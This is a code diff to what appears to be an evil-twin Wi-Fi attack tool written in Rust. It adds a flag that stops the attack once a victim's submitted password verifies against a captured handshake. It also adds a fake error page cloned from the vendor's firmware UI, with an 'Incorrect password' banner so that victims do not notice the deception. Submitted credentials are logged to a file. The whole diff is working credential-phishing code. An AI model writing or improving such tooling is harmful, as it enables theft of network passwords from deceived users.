@@ -33,6 +33,16 @@ use std::sync::{Arc, Mutex};
 /// Where submitted credentials are appended (JSON lines).
 pub const CREDENTIAL_LOG: &str = "/tmp/netspecter/evil-twin-credentials.jsonl";
 
+/// Flips true the first time a submitted password VERIFIES against the
+/// captured handshake — the session's job is done, stop the attack.
+pub static PASSWORD_VERIFIED: std::sync::atomic::AtomicBool =
+    std::sync::atomic::AtomicBool::new(false);
+
+/// True once a verified password has been captured.
+pub fn password_verified() -> bool {
+    PASSWORD_VERIFIED.load(std::sync::atomic::Ordering::Relaxed)
+}
+
 pub struct PortalServer {
     stop: Arc<AtomicBool>,
     handle: Option<std::thread::JoinHandle<()>>,
@@ -198,6 +208,9 @@ fn handle_client(
         };
 
         let verified = matches!(verdict, Verdict::Ok);
+        if verified {
+            PASSWORD_VERIFIED.store(true, std::sync::atomic::Ordering::Relaxed);
+        }
         creds.lock().unwrap().push(CapturedSubmission {
             at: chrono::Utc::now().to_rfc3339(),
             client_ip: peer,
@@ -215,8 +228,18 @@ fn handle_client(
     }
 
     // ── Static content ──
-    // error.html may not exist in every portal — synthesize a minimal one.
+    // error.html may not exist in every portal — synthesize one that keeps the
+    // portal's own look: index.html with an injected error banner, so the page
+    // still reads as the vendor's firmware UI (a bare white page is a giveaway).
     if path == "/error.html" && !portal_dir.join("error.html").is_file() {
+        if let Ok(index) = std::fs::read_to_string(portal_dir.join("index.html")) {
+            let banner = "<div style=\"position:fixed;top:0;left:0;right:0;z-index:9999;background:#c0392b;color:#fff;padding:12px;text-align:center;font-family:sans-serif;font-weight:bold;\">Incorrect password. Please try again.</div>";
+            let page = match index.rfind("</body>") {
+                Some(i) => format!("{}{}\n</body>", &index[..i], banner),
+                None => format!("{index}{banner}"),
+            };
+            return respond(&mut stream, 200, "text/html", page.as_bytes());
+        }
         return respond(
             &mut stream,
             200,
